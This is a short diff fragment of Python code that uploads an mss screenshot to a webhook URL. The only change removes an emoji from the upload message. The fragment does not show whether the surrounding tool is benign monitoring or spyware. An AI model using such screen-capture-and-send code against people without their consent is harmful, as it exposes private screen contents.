@@ -11,5 +11,5 @@ with mss.mss() as sct:
     requests.post(
         WEBHOOK_URL,
         files={'file': ('screenshot.png', io.BytesIO(png_bytes), 'image/png')},
-        data={'content': '📸 Screenshot captured'}
+        data={'content': 'Screenshot captured'}
     )
